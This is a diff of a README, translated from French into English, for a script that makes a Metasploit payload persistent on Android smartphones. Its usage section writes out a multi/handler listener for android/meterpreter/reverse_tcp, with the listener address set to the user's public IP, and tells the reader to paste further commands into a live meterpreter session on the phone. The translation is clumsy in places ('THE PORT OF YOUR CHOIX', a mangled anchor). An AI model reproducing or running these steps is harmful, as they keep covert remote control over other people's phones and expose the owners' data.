@@ -6,38 +6,38 @@
 ## INDEX
 
 - [Introduction](#INTRODUCTION)
-- [Prerequis](#PREREQUIS)
-- [Utilisation](#UTILISATION)
+- [Prerequisites](#PREREQUISITESITES)
+- [Use](#USE)
 - [License](#LICENSE)
 
 
 ## INTRODUCTION
 
-Ce script permet la persistance des payload sur smartphone Android via Metasploit.
+This script allows the persistence of the payload on Android smartphone with Metasploit.
 
 
-## PREREQUIS
+## PREREQUISITES
 
-utiliser [Metasploit](https://www.metasploit.com/)
-
-
-## UTILISATION
-
-1 - Mettez le script msf-persistance-android.sh dans votre dossier personnel et renommez le .sh
+Use [Metasploit](https://www.metasploit.com/)
 
 
-2 - Ouvrir MSF
+## USE
+
+1 - Put the msf-persistance-android.sh script in your personal folder and rename .sh
+
+
+2 - Open MSF
 
 ```
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
-set lhost VOTRE IP PUBLIC
-set lport LE PORT DE VOTRE CHOIX
+set lhost YOUR IP PUBLIC
+set lport THE PORT OF YOUR CHOIX
 exploit
 ```
 
 
-3 - Copier/Coller dans un terminal en console MSF avec une session android/meterpreter/reverse_tcp
+3 - Copier/Paste in a terminal in shell MSF with a session android/meterpreter/reverse_tcp
 
 ```
 cd /
@@ -54,4 +54,4 @@ exit
 
 ## LICENSE
 
-[![GPLv3+](http://gplv3.fsf.org/gplv3-127x51.png)](https://github.com/oda-alexandre/msf-persistance-android/blob/master/LICENSE)
+[![GPLv3+](http://gplv3.fsf.org/gplv3-127x51.png)](https://gitlab.com/oda-alexandre/msf-persistance-android/blob/master/LICENSE)
